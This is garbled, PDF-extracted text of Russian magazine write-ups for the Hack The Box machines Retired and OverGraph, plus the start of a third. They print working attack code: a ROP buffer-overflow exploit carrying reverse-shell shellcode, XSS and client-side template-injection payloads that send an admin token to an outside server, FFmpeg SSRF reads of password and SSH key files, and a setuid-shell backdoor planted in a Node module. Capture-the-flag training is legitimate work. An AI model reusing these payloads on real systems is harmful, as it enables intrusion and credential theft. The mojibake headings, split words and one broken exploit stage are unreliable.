              Резуль тат поиска файлов PHP с помощью ﬀuf


ffuf -u 'http://retired.htb/FUZZ.html' -t 256 -w directory_2.3_
medium_lowercase.txt




             Резуль тат поиска файлов HTML с помощью ﬀuf

Наш ли всего одну новую страницу — beta.html.





                         Страница beta.html

На странице нужно заг ружать файл лицен зии, который будет отправлен на сле-
дующий адрес:


http://retired.htb/activate_license.php

Посмотрим, что произойдет с файлом даль ше. Для этого получим код найден -
ного обработ чика.


curl 'http://retired.htb/index.php?page=activate_license.php'





                 Исходный код activate_license.php

Таким образом, заг ружен ный через форму файл будет отправлен приложению,
которое работает на локаль ном порте 1337. Попробу ем выяснить, что это за
приложение, с помощью LFI. Я запустил Burp Intruder и передал ему список
информативных файлов из Unix.





                    Burp Intruder — вклад ка Positions

В резуль тате сканирования узнаем, что нам доступен в том числе и файл /
proc/sched_debug, где и находим процесс activate_license и соот ветству -
ющий ему иден тификатор процесса (PID) — 487.





                      Резуль тат сканирования

Зная PID процесса, мы можем получить полную коман дную строку, что даст
нам путь к файлу.


curl 'http://retired.htb/index.php?page=/proc/487/cmdline'





                  Коман дная строка процесса 487

Получаем полный путь к файлу обработ чика, а так же видим, что порт для прос-
лушивания передается в качестве аргу мен та. Скачиваем этот файл на локаль -
ный хост для анализа.


wget 'http://retired.htb/index.php?page=/usr/bin/activate_license'




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ




                        ПИШЕМ ЭКСПЛОИТ
                             ROP + MPROTECT
            И ИСПОЛЬЗУЕМ ПЕРЕПОЛНЕНИЕ БУФЕРА





ÒÎ×ÊÀ ÎÏÎÐÛ
Ïåðåïîëíåíèå áóôåðà
Теперь перейдем к анализу приложения. Каждый выбирает для себя более
удобный инстру мент, но я остаюсь приверженцем IDA Pro. Закиды ваем
бинарь в деком пилятор и ищем фун кцию main.
   Итак, приложение стан дартным способом откры вает порт, ожидает соеди-
нения и, если оно происходит и если фун кция fork выполнена успешно, запус-
кает фун кцию activate_license.





                      Псевдокод фун кции main

В фун кции activate_license происходит бескон троль ное чтение из буфера
размером 512 байт.





                  Псевдокод фун кции activate_license

Таким образом, мы наш ли место для переполнения буфера, осталось опре-
делить ся со смещением наг рузки и методом эксплу атации. Для этого нужно
запустить прог рамму в удален ном отладчике, переполнить буфер и пос-
мотреть, на каком смещении от начала буфера будет вершина стека, ког да
прог рамма упадет.





              Парамет ры удален ного отладчика IDA Pro

Но при отладке мы не попадаем в фун кцию activate_license, поэтому мне
приш лось запат чить инструк цию условного перехода (jnz).





                   Код прог раммы до исправления





                   Код прог раммы после пат ча jnz

Теперь сгенерируем последователь ность де Брёйна, которая поможет быстро
определить смещение.





              Генерирование последователь ности де Брёйна

От правляем эти дан ные нашей прог рамме и после ошибки выполнения смот -
рим дан ные в регистре RBP.


echo aaabaaac... | nc 127.0.0.1 1337





                       Значения регистров

Кон вертируем получен ное значение и вычисляем смещение — 520.





                     Получение смещения

Вы бирать метод долго не приш лось. Мы можем получить доступ к области
неисполняемой памяти.





                           Карта памяти

Для успешной эксплу атации мы отправим вместе с дан ными шелл-код,
с помощью  ROP-цепочек  сделаем  этот  сег мент  памяти  исполняемым
и передадим управление на шелл-код.
   Впоследствии будем дополнять следующий шаблон эксплоита.


#!/usr/bin/python3


from pwn import *
context.clear(arch='amd64')


###########################


payload = b'A' * 520


r = requests.post(f"http://10.10.11.154/activate_license.php",
files = { "licensefile": payload } )


ROP-öåïî÷êè
Для работы с ROP-цепочками нам пот ребу ется карта памяти процесса с уда-
лен ного хоста, получить которую мы можем через LFI.


curl 'http://retired.htb/index.php?page=/proc/487/maps'





                           Карта памяти

Для поиска ROP-цепочек нам нужно получить исполь зуемую версию libc.


curl 'http://retired.htb/index.php?page=/usr/lib/x86_64-linux-gnu/
libc-2.31.so' --output libc-2.31.so

Теперь можем определить ся и с самой ROP-цепочкой. Нам нужно изменить
права на блок памяти, и в этом поможет фун кция mprotect:


int mprotect(const void *addr, size_t len, int prot);

Фун кция принимает три аргу мен та, передавать которые мы будем инструк -
циями pop rdi, pop rsi и pop rdx. Проверить наличие соот ветству ющих
цепочек мы можем следующим образом:


from pwn import *
context.clear(arch='amd64')
libc = ELF("libc-2.31.so", checksec=False)
rop = ROP([libc])


rop.rdi
rop.rsi
rop.rdx
libc.symbols['mprotect']





                    Проверка наличия цепочек

Есть все дан ные для вызова фун кции mprotect, передавать в качестве
парамет ров мы будем адрес стека и его размер (получаем из карты памяти),
третий параметр фун кции — новые права, исполь зуем маску rwx (7). Вот код
эксплоита на текущем этапе:


#!/usr/bin/python3


from pwn import *
context.clear(arch='amd64')


stack_base = 0x7ffc93704000
stack_size = 0x7ffc93725000 - stack_base


libc = ELF("libc-2.31.so", checksec=False)
libc.address = 0x7f522503d000
rop = ROP([libc])


payload += p64(pop_rdi) + p64(stack_base)


payload = b'A' * 520
payload += p64(rop.rdi[0])
payload += p64(stack_base)
payload += p64(rop.rsi[0])
payload += p64(stack_size)
payload += p64(rop.rdx[0])
payload += p64(7)
payload += p64(libc.symbols['mprotect'])


r = requests.post(f"http://10.10.11.154/activate_license.php",
files = { "licensefile": payload } )


Øåëë-êîä
Следующей инструк цией станет jmp на адрес в регистре RSP (указатель сте-
ка), так как там будет расположен шелл-код. Но найти инструк цию jmp rsp
в регистре не удалось, поэтому скачаем и проверим дру гие исполь зуемые
библиотеки. Нужную инструк цию обнаруживаем в библиотеке libsqlite.


curl 'http://retired.htb/index.php?page=/usr/lib/x86_64-linux-gnu/
libsqlite3.so.0.8.6' --output libsqlite3.so.0.8.6


libsqlite = ELF("libsqlite3.so.0.8.6", checksec=False)
rop = ROP([libsqlite])
rop.jmp_rsp





                    Проверка наличия цепочек

Сам  шелл-код  сгенерируем  с  помощью  msfvenom  из  Metasploit
Framework .


msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.21 LPORT=
4321 -f py





                       Генерирование шелл-кода

Полный код эксплоита будет следующим:


#!/usr/bin/python3


from pwn import *
import requests
context.clear(arch='amd64')


stack_base = 0x7ffc93704000
stack_size = 0x7ffc93725000 - stack_base


libc = ELF("libc-2.31.so", checksec=False)
libc.address = 0x7f522503d000
libsqlite = ELF("libsqlite3.so.0.8.6", checksec=False)
libsqlite.address = 0x7f5225202000
rop = ROP([libc, libsqlite])


buf = b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
buf += b"\x97\x48\xb9\x02\x00\x10\xe1\x0a\x0a\x0e\x15\x51\x48"
buf += b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
buf += b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
buf += b"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
buf += b"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"


payload = b'A' * 520
payload += p64(rop.rdi[0])
payload += p64(stack_base)
payload += p64(rop.rsi[0])
payload += p64(stack_size)
payload += p64(rop.rdx[0])
payload += p64(7)
payload += p64(libc.symbols['mprotect'])


payload += p64(rop.jmp_rsp[0])
payload += buf


r = requests.post(f"http://10.10.11.154/activate_license.php",
files = { "licensefile": payload } )

Запускаем листенер на указан ном при генерации шелл-кода порте (rlwrap -
cAr nc -lvp 4321) и выполняем эксплоит.





                   Вы полнение эксплоита





                         Бэк коннект с сервера

И получаем доступ к хосту.


ÏÐÎÄÂÈÆÅÍÈÅ
Мы получили доступ к хосту, теперь необходимо собрать информацию. Рыть ся
в системе можно долго, поэтому исполь зуем скрипт PEASS.




Что делать после того, как мы получили доступ в систему? Вариантов даль -
нейшей эксплу атации и повышения привилегий может быть очень много, как в
Linux, так и в Windows. Чтобы собрать информацию и наметить цели, можно
исполь зовать  Privilege Escalation Awesome Scripts SUITE (PEASS) — набор
скриптов, которые проверяют систему на автомате.





                     Резуль тат работы скрипта

Скрипт находит много интересного в разделе с бэкапами: какой-то поль -
зователь ский файл /usr/bin/webbackup, службу website_backup, а так же
таймер для этой службы. Глянем, что собой пред ставляет поль зователь ский
файл.



                    Проверка файла webbackup

Это скрипт на Bash, поэтому просмотрим его исходный код.





                 Содержимое файла webbackup

Этот сценарий должен архивировать при помощи zip все содержимое катало-
га /var/www/html и сохранять резуль тат в /var/www/. При этом найден ная
служба, скорее всего, запускает скрипт раз в минуту.





                   Список системных таймеров

Подобные задания на Hack The Box не новы, и заяд лые «игроки» знают, что
делать в дан ном слу чае: создавать сим волическую ссылку на дру гой файл. Тог -
да при обработ ке этой ссылки будут произведены операции с самим файлом.
Создадим в каталоге /var/www/html ссылку на приват ный ключ поль зователя.


ln -s /home/dev/.ssh/id_rsa id_rsa

Теперь дождемся срабаты вания скрипта, разархивиру ем толь ко что созданный
архив и заберем желан ный ключ.





                   Приват ный ключ поль зователя

И, под ключившись с получен ным ключом, забираем флаг поль зователя.





                        Флаг поль зователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ
В домаш нем каталоге поль зователя находим интересный проект emuemu.





           Содержимое домаш него каталога поль зователя

Файл из этого проекта уже был упомянут в выводе LinPEAS в разделе Linux
capabilities. Но сначала пару слов о том, что же это такое.





                      Linux capabilities из вывода LinPEAS

В Linux поль зователь root получает особый кон текст при запуске любых про-
цессов. Так, ядро и приложения, работающие от имени root, обычно пропус-
кают любые ограничения, задан ные на действия в определен ном кон тек сте,
поэтому root может делать все, что захочет. Но что, если процессу, который
работает в непривилегирован ном кон тек сте, нужно выполнить требующее при-
вилегий действие, не повышая уровня прав?
   Например, бывает нужно разрешить процессу записы вать в журнал аудита
ядра, но не позволять отключить этот аудит. Ведь если запустить этот процесс
в кон тек сте рута, он сможет выполнить оба действия!
   Тут на помощь и приходят Linux capabilities. Эти «возможности» предос-
тавляют процессу не все множество привилегий, а какое-то его под множество.
Дру гими словами, все привилегии рута разбиваются на более мелкие незави-
симые друг от дру га привилегии и процесс получает толь ко те, которые ему
нужны.
  В дан ном слу чае активирована привилегия cap_dac_override, которая
позволяет обойти проверку прав на запись для любого файла, то есть дает воз-
можность записы вать дан ные в абсолют но любой файл.
   Теперь перейдем к самому приложению, благо есть даже исходные коды.
Так, в файле reg_helper.c происходит запись в /proc/sys/fs/binfmt_misc/
register.





                 Содержимое файла reg_helper.c

Посколь ку в binfmt_misc записы вает ся под кон троль ный нам ввод, мы можем
исполь зовать готовый эксплоит , чтобы запустить рут кит и получить кон троль
над системой. Но в файл эксплоита нужно внести несколь ко изменений:
 • указать целевой бинарный файл;
 • убрать фун кцию not_writeable .





                   Изменен ный файл эксплоита





              Изменен ный код эксплоита (продолжение)

Вы полняем наш файл и получаем привилегирован ную коман дную оболочку.





                            Флаг рута

Машина захвачена!
ВЗЛОМ





        ИЗВЛЕКАЕМ ДАННЫЕ
    ЧЕРЕЗ ЦЕПОЧКУ OPEN REDIRECT,
             RXXS И CSTI




В этом рай тапе мы с тобой про ведем мно -
жество ска ниро ваний цели, что бы опре-
делить    точ ки    вхо да,   порабо таем
с GraphQL, про эксплу ати руем цепоч ку уяз -
вимостей Open  Redirect,  Reected XSS             RalfHacker                                                                                          hackerralf8@gmail.com
и  CSTI для  кра жи админ ско го  токена.
Затем получим доступ к хосту, про читав
SSH-ключ  через SSRF  в FFmpeg. Все
это — в рам ках про хождения сложной
машины  OverGraph  с  пло щад ки  Hack
The Box.




                     Под ключаться к машинам с HTB рекомендует ся
                        только через VPN. Не делай этого с компьютеров,
                       где есть важ ные для тебя данные, так как ты ока -
                    жешься в общей сети с дру гими учас тни ками.



ÐÀÇÂÅÄÊÀ
Ñêàíèðîâàíèå ïîðòîâ
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.157 overgraph.htb

И запускаем сканирование портов.




Сканирование портов — стан дартный первый шаг при любой атаке. Он поз-
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инстру мент для сканирования — это Nmap. Улучшить
резуль таты его работы ты можешь при помощи следующего скрипта.


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f
 1 | tr '\n' ',' | sed s/, $/ / )
 nmap -p$ports -A $1


Он действу ет в два этапа. На первом производит ся обычное быстрое сканиро-
вание, на втором — более тщатель ное сканирование, с исполь зованием име-
ющихся скриптов (опция -A).





                     Резуль тат работы скрипта

От кры то два порта: 22 — служба OpenSSH 8.2p1 и 80 — веб-сервер Nginx
1.18.0. Nmap показал нам, что выполняет ся редирект на адрес http://graph.
htb. Тоже добавляем этот адрес в файл /etc/hosts.


10.10.11.157 overgraph.htb graph.htb





                     Главная страница http://graph.htb

Сайт оказался одностраничным, поэтому нужно найти новые цели для тес-
тирования.


Ñêàíèðîâàíèå âåá-êîíòåíòà
Попробу ем поискать скры тые каталоги и файлы при помощи ffuf.




Од но из первых действий при тестировании безопасности веб-приложения —
это  сканирование методом  перебора  каталогов,  чтобы  найти  скры тую
информацию и недоступные обычным посетителям фун кции. Для этого можно
исполь зовать прог раммы вроде dirsearch и DIRB.
  Я пред почитаю лег кий и очень быстрый ﬀuf . При запуске указываем сле-
дующие парамет ры:
 • -w — словарь (я исполь зую словари из набора SecLists);
 • -t — количество потоков;
 • -u — URL;
 • -fc — исключить из резуль тата ответы с кодом 403.





ffuf -u 'http://graph.htb/FUZZ' -t 256 -w directory_2.3_medium_
lowercase.txt




            Резуль тат сканирования каталогов с помощью ﬀuf

И не находим ничего интересного, даже в файле server-status. Поэтому
попробу ем просканировать под домены, для чего снова будем исполь зовать
ﬀuf. К парамет рам добавим заголовки -H и --fs, это поможет отсеять стра-
ницы по размеру.


ffuf -u 'http://graph.htb/' -t 256 -w subdomains-top1million-
110000.txt -H 'Host: FUZZ.graph.htb' --fs 178




           Резуль тат сканирования под доменов с помощью ﬀuf

И находим новый под домен internal. Добавляем его в файл /etc/hosts.


10.10.11.157 overgraph.htb graph.htb internal.graph.htb

Но, открыв сайт в браузере, сразу натыкаемся на форму авторизации.





            Форма авторизации http://internal.graph.htb

Так как всю работу проводим через Burp, то обнаружим в Burp History обра-
щение еще к одному домену — internal-api.graph.htb.





                       Логи Burp History

Добавляем еще одну запись в файл /etc/hosts и затем откры ваем страницу /
graphql.


10.10.11.157 overgraph.htb graph.htb internal.graph.htb internal-
api.graph.htb





             Главная страница сайта http://internal-api.graph.htb

На странице исполь зует ся GraphQL. Это язык запросов, с помощью которого
клиент ские приложения работают с дан ными. «Схемы» GraphQL позволяют
организовывать создание, чтение, обновление и удаление дан ных в приложе-
нии. Давай получим дан ные __schema и отфиль тру ем названия типов, это мож-
но сделать, передав в парамет ре query следующий запрос:


{__schema{types{name,fields{name}}}}





                        От вет сервера





                   От вет сервера (продолжение)

На этом пока все, но мы еще не сканировали каталоги на новом домене. Поп-
робу ем сделать это. Но, как толь ко мы обратим ся к любой странице, получим
ответ, что запросы GET не под держивают ся. Поэтому будем сканировать зап-
росом POST. А так как на домене кру тит ся API, то и исполь зовать будем соот -
ветству ющий словарь.


ffuf -u 'http://internal-api.graph.htbFUZZ' -t 256 -X POST -w
apiscan.txt





              Резуль тат сканирования API с помощью ﬀuf

И находим три новые страницы, с которы ми начнем работу.


ÒÎ×ÊÀ ÂÕÎÄÀ
Итак, мы имеем следующие API:
 • register — для регистрации поль зователя;
 • verify — пред положитель но для проверки при регистрации;
 • code — пока непонят но, но, скорее всего, для проверки кода, отправ-
   ленного на email.

Я начал со страницы /api/register. Передаем наиболее вероятные парамет -
ры: имя поль зователя, пароль и адрес элек трон ной почты.


{
    "username":"ralf",
    "email":"ralf@graph.htb",
    "password":"ralf"
}





                Попыт ка регистрации поль зователя

Но в ответ нам говорят, что у нас неверный email или он не верифицирован.
Это интересно, так как у нас остается всего две страницы для регистрации.
Видимо, страница /api/code нужна для получения кода. Отправим туда свой
email.


{
     "email":"ralf@graph.htb"
}





                       Получение кода

И нам сообщают, что четыре цифры были отправлены на указан ный почтовый
ящик. По тестовому сообщению на странице /api/verify узнаем, что вместе
с почтой нужно присылать и код.





                        Запрос к /api/verify

Я попробовал перебрать этот код с помощью Burp Intruder, благо ком -
бинаций всего 10 000. Но уже на одном из первых запросов все ломается, так
как мы превысили количество попыток!





           Сообщение о превышении количества запросов

Я очень долго просидел на этом этапе — приш лось даже просить под сказки
у дру зей. Мне посоветовали углу бить ся в механизм проверки кода. Тог да, пот -
ратив еще нем ного времени, я нашел NoSQL-инъекцию, которая позволяет
верифицировать почту, предоставляя неправиль ный код. В дан ном запросе мы
получим положитель ный резуль тат, если код не равен 0000.


{
    "email":"ralf@graph.htb",
    "code":{
        "$ne":"0000"
    }
}





                      Верификация почты




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ




                            ИЗВЛЕКАЕМ ДАННЫЕ
           ЧЕРЕЗ ЦЕПОЧКУ OPEN REDIRECT, RXXS И CSTI




Приходит под тверждение того, что почта верифицирована. Повторим регис-
трацию и получим сообщение, что пароль и его под тверждение не совпадают.





                Попыт ка регистрации поль зователя

Тог да я перепробовал разные имена поля под тверждения пароля и определил,
что в дан ном слу чае под ходит confirmPassword.





                     Регистрация поль зователя

И аккаунт создан! Перейдем к форме авторизации на втором домене и авто-
ризу емся.





                 Главная страница http://internal.graph.htb

А во входящих находим сообщение от поль зователя Sally.





                       Входящие сообщения

Нас просят прислать ссылку. Попробу ем открыть локаль ный сервер и скинуть
ссылку на него. В итоге приходит запрос.





                    Логи веб-сервера Python 3

Давай посмотрим, как это можно исполь зовать.


ÒÎ×ÊÀ ÎÏÎÐÛ
Если еще раз взглянуть на страницу, можно заметить над меню над пись null
null. В исходном коде есть отсылка к нашему поль зователю. А в локаль ном
хранилище браузера (F12 → Application) найдем запись, что это firstname
и lastname.





                    Исходный код страницы





                  Локаль ное хранилище браузера

Перейдем в настройки профиля и увидим то же самое, толь ко с возможностью
изменить эти значения.





                          Страница Prole


CSTI
Над пись null null натолкну ла меня на мысль об исполь зовании шаблонов.
Давай проведем базовый тест.





               Новые значения имени поль зователя





                 Отображение имени поль зователя

Как можно увидеть, вместо введен ной строки получаем резуль таты выраже-
ний, а значит, есть уязвимость в шаблонах! Вот толь ко в локаль ном хранилище
эти значения хранят ся, как и вводились. Значит, шаблон работает на клиент -
ской стороне, а это уже путь для CSTI — инъекции шаблонов на стороне кли-
ента.





                  Локаль ное хранилище браузера

Так же я обратил внимание на параметр admin со значением false. Я изменил
на true и перезаг рузил страницу. В меню появилась графа Uploads.





                       Изменен ное меню

Толь ко вот форма заг рузки не дает заг рузить файл. Если вернемся к нашей
схеме GraphQL, то можем посмотреть на необходимые парамет ры, к примеру
adminToken.





                  Парамет ры из схемы GraphQL

Таким образом, нам нужен adminToken поль зователя Sally. Но получить его
непросто. Тут появился следующий план: если заставим целевого поль зовате-
ля выполнить запрос на смену имени (по ссылкам же он переходит!), то
в  качестве  нового имени  установим  наг рузку  CSTI,  передающую нам
adminToken. В исходниках видим исполь зование AngularJS.





                    Исходный код страницы

AngularJS — это популярная библиотека JavaScript, которая сканиру ет HTML
на пред мет тегов с атрибутом ng-app (дирек тива AngularJS). Ког да дирек тива
добавляет ся в тег, появляет ся возможность выполнять выражения JavaScript
в двойных фигурных скобках.
   Уязвимость Template  Injection возникает,  ког да приложение, исполь зуя
какой-нибудь шаблонизатор, динамически внед ряет поль зователь ский ввод
в веб-страницу. Ког да страница отображается, фреймворк ищет в странице
шаблонное выражение и выполняет его. Основное отличие CSTI от SSTI зак -
лючается в том, что при CSTI мы можем добить ся лишь выполнения про-
изволь ного кода на JavaScript. Две самые популярные наг рузки для CSTI
в AngularJS:


{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}





                    Новое имя поль зователя

Обновляем страницу и первым делом видим окош ко алерта.





               Вы зов alert(1) при заг рузке страницы

А теперь попробу ем эксфиль тровать токен, для чего создадим у себя в хра-
нилище тестовый.





                  Локаль ное хранилище браузера

В качестве наг рузки будем исполь зовать знаменитый стилер, который похища-
ет дан ные через картинку, а доступ к хранилищу получим через window.
localStorage.


{{$on.constructor('new Image().src="http://10.10.14.123:8000/
?a="+window.localStorage.getItem("adminToken");')()}}

Обновляем страницу и в логах локаль ного веб-сервера находим значение тес-
тового токена.





                       Логи веб-сервера

Наг рузка для эксфиль трации готова, теперь разберем ся, как под сунуть поль -
зователю наш код.


Open Redirect
Я снова просмотрел все сайты и на самом главном домене нашел что-то вро-
де редирек та.





                 Код главной страницы http://graph.htb

Если существу ет GET-параметр redirect, то фун кция window.location.
replace установит в качестве содержимого текущей страницы код, взятый
по ссылке  из redirect.  Благо мы можем  вставить вместо URL  код
на JavaScript:


http://graph.htb/?redirect=javascript:alert( 1 )





              Вы полнение кода через JavaScript URL

Осталось разобрать ся с дан ными, которые отправляют ся для изменения име-
ни поль зователя.


GraphQL
В Burp History найдем запрос, которым мы изменили собствен ное имя.





                   Запрос на изменение профиля

Один из парамет ров — id поль зователя, а это нем ного усложняет задачу. Сно-
ва вернемся  к GraphQL и посмотрим,  какой из типов содержит поле
Assignedto.





                              Тип task

Нас интересу ет тип task, который мы можем получить запросом tasks.





                             Тип Query

Таким образом, нам нужно выполнить запрос tasks с парамет ром username,
в котором мы передадим имя поль зователя Sally. Нас интересу ет толь ко поле
Assignedto.


query task{
   task(username:"Sally"){
      Assignedto
   }
}





                             ID поль зователя Sally


Reflected XSS
Мы получили ID целевого поль зователя, поэтому можем собрать XSS-наг рузку.
Наша наг рузка с помощью XMLHttpRequest выполнит POST-запрос на http://
internal-api.graph.htb/graphql и передаст наг рузку CSTI как параметр
firstname:


var req = new XMLHttpRequest();
req.open('POST', 'http://internal-api.graph.htb/graphql', false);
req.setRequestHeader("Content-Type","text/plain");
req.withCredentials = true;
var body = JSON.stringify({
       operationName: "update",
       variables: {
               firstname: "{{$on.constructor('new Image().src="
http://10.10.14.123:8000/?a="+window.localStorage.getItem(
"adminToken");')()}}",
               lastname: "sally",
               id: "62ee9709c53e9f1214e1af5e",
               newusername: "sally"
       },
       query: "mutation update($newusername: String!, $id: ID!,
$firstname: String!, $lastname: String!) {update(newusername:
$newusername, id: $id, firstname: $firstname, lastname:$lastname){
username,
email,id,firstname,lastname,adminToken}}"
});
req.send(body);

Сначала я хотел передать ее в редирек тор по такой схеме:


javascript:eval(atob(_URL_encode(_BASE64_encode(payload))))

Но это не сработало. Тог да я записал наг рузку в отдель ный файл на локаль ном
веб-сервере и заг рузил удален но, исполь зуя вставку кода фун кцией document.
body.innerHTML:


javascript:document.body.innerHTML+='<script src="http://10.10.14.
123:8000/t.js"></script>'

Необходимо закодировать эту наг рузку в кодировку URL и отправить ссылку
поль зователю в чате:


http://graph.htb/?redirect=javascript:document.body.
innerHTML%2b%3d'<script+src%3d"http://10.10.14.123:8000/t.js"></
script>'

Даль ше механизм сработает так:
 1. Поль зователь переходит по ссылке.
 2. Через редирект с нашего веб-сервера заг ружается JS-скрипт с наг рузкой.
 3. Наг рузка отправляет запрос на изменение профиля и устанавливает дру гую
   наг рузку CSTI.
 4. При обновлении страницы наг рузка CSTI извлекает adminToken из локаль -
   ного хранилища и отправляет его на наш сервер.





                   Логи локаль ного веб-сервера




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ




                            ИЗВЛЕКАЕМ ДАННЫЕ
           ЧЕРЕЗ ЦЕПОЧКУ OPEN REDIRECT, RXXS И CSTI




Получаем adminToken и пробуем отправить любой из пред ложен ных файлов.





                   Форма заг рузки файла

Появилось сообщение, что файл заг ружен, а значит, мы получили нужный
токен. Продолжаем тестирование.


ÏÐÎÄÂÈÆÅÍÈÅ
Набор принимаемых форматов файлов натолкнул меня на мысль об исполь -
зовании FFmpeg — я с ним уже сталкивался в подобных ситу ациях. Первым
делом стоит проверить, есть ли для обнаружен ной CMS готовые эксплоиты.
Поищем в интернете на сайтах вроде HackerOne, exploit-db, а так же GitHub.
Находим под ходящий эксплоит на HackerOne.





                   Поиск эксплоитов в Google

FFmpeg, если ты вдруг про него не слы шал, — это мощнейший опен сорсный
инстру мент для преобразования видео. В него входит несколь ко библиотек:
 • libavcodec — библиотека аудио- и видеокодеков, которая исполь зует ся
   во многих ком мерческих и бесплат ных продук тах;
 • libavformat — библиотека муль типлексирования и демуль типлексирования
   кон тейнеров аудио/видео;
 • ﬀmpeg — прог рамма для коман дной строки, которая запускает операции
   над видеофайлами.


SSRF
Для эксплу атации под делки запросов на стороне сервера (SSRF) нам просто
нужно заг рузить файл .avi с внед ренны ми HLS-дирек тивами (список воспро-
изведения) внут ри.


#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://[наш сервер]
#EXT-X-ENDLIST

После заг рузки файла с таким содержимым мы просто получим запрос на свой
сервер. User-Agent будет иметь версию упомяну той библиотеки libavformat.


LFR
Для эксплу атации уязвимости локаль ного чтения файлов (LFR) нужно помес-
тить на своем сервере специаль ный файл и ссы лать ся на него внут ри видео,
которое якобы будет заг ружать ся. Содержимое файла header.m3u8:


#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:,
http://[наш сервер]?

А теперь, чтобы получить первую строку из файла /etc/passwd, заг ружаемый
AVI должен иметь следующее содержимое:


#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://[наш сервер]/header.m3u8|file:///etc/passwd
#EXT-X-ENDLIST


FFmpeg HLS SSRF
Проект FFmpeg-HLS-SSRF позволит нам получить весь файл целиком. Заг -
ружаем его на сервер:


python3 server.py --external-addr 10.10.14.123 --port 8000

После этого создадим файл AVI со следующим содержимым:


#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://10.10.14.123:8000/initial.m3u?filename=/etc/passwd
#EXT-X-ENDLIST

Это поможет нам извлечь файл /etc/passwd. После того как сервер выдаст
ошибку, его можно остановить.





                     Ошибка сервера

В каталоге сервера найдем файл с эксфиль трован ными дан ными.





                 Содержимое файла /etc/passwd

Из файла узнаем о поль зователе user. Попробу ем получить его приват ный
ключ SSH.


#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://10.10.14.123:8000/initial.m3u?filename=/home/user/.ssh/id_
rsa
#EXT-X-ENDLIST



                   Содержимое файла id_rsa

Теперь осталось разобрать ся с его форматированием. Я открыл созданный
файл в hex-редак торе и определил, что вместо сим вола перевода строки
исполь зует ся null-байт.



                   Файл id_rsa в hex-редак торе

Заменим null-байт сим волом \n и сохраним уже с нормаль ным форматиро-
ванием.





                      SSH-ключ поль зователя

Коман дой chmod 0600 id_rsa назначаем нужные файлу права и под ключаем -
ся по SSH.





                        Флаг поль зователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ
В домаш нем каталоге поль зователя, кроме файла с флагом, находим еще и
каталог с каким-то приложением на Node.js.





                 Содержимое каталога onegraph

Проверяя прослушиваемые порты, находим типичный для веба порт 8080,
который открыт для локаль ного хоста.


netstat -tlpn





                      Прослушиваемые порты

Проверим  найден ное  приложение.  Для  этого  нужно  будет  прокинуть
порт 8080 на свой хост с помощью SSH.


ssh -L 8081:127.0.0.1:8080 -i id_rsa user@overgraph.htb

Таким образом, весь трафик, который мы пош лем на локаль ный порт 8081,
будет  тун нелирован  на  порт  8080  указан ного  хоста  (в  дан ном  слу -
чае 127.0.0.1) через SSH-хост.





                        От вет сервера

Но приложение нам отвечает уже знакомым ответом. Я проверил наличие
известных каталогов, к примеру /graphql.





                         Страница /graphql

И это тот же API, c которым мы работали рань ше. Толь ко в дан ном слу чае мы
имеем доступ к исходным кодам. Причем наш поль зователь — владелец боль -
шинства файлов, что дает нам возможность записы вать свой код! Почти
во  всех файлах под ключает ся и исполь зует ся модуль mongoose,  как и
в addUser.js.





                    Исходный код addUser.js

Создать файл в текущем каталоге мы не можем, но можем перейти к самому
модулю в каталоге node_modules.





           Содержимое каталога /node_modules/mongoose

Файл index.js слу жит толь ко для под ключения модулей из каталога lib.





              Содержимое файла index.js и каталога lib

В файле addUser.js исполь зовался имен но модуль connection, поэтому вне-
сем изменения в файл connection.js. В самом начале под ключим модуль
child_process.


const { exec } = require("child_process");





                   Исходный код connection.js

А в конструк торе класса Connection вызовем фун кцию exec, куда передадим
коман ду назначения S-бита файлу коман дной оболочки bash.


exec("cp /bin/bash /tmp/bash && chmod u+s /tmp/bash", (error,
stdout, stderr) => {
 if (error) {
      console.log(`error: ${error.message}`);
       return;
 }
 if (stderr) {
       console.log(`stderr: ${stderr}`);
       return;
 }
 console.log(`stdout: ${stdout}`);
});





                   Исходный код connection.js




Ког да у файла установлен атрибут setuid (S-атрибут), обычный поль зователь,
запускающий этот файл, получает повышение прав до поль зователя — вла-
дель ца файла в рам ках запущен ного процесса. После получения повышен ных
прав приложение может выполнять задачи, которые недоступны обычному
поль зователю. Из-за возможности состояния гон ки многие операционные сис-
темы игнориру ют S-атрибут, установленный shell-скриптам.





                            Флаг рута

Мы получаем доступ от имени рута, а значит, машина захвачена!
ВЗЛОМ





     ЭКСПЛУАТИРУЕМ ИНЪЕКЦИЮ
       ШАБЛОНОВ В СЕРВИСЕ
      ОБРАБОТКИ ИЗОБРАЖЕНИЙ




В этом рай тапе я покажу, как эксплу ати -
ровать  сер верную  инъекцию шаблонов
(SSTI) в сер висе для распозна вания тек ста
на изображени ях. А в повышении при виле-
гий нам поможет пользовательский скрипт             RalfHacker                                                                                          hackerralf8@gmail.com
для отслежива ния логина и лога ута поль-
зователей. Упражняться будем на «лег кой»
машине Late с пло щад ки Hack The Box.




                     Под ключаться к машинам с HTB рекомендует ся
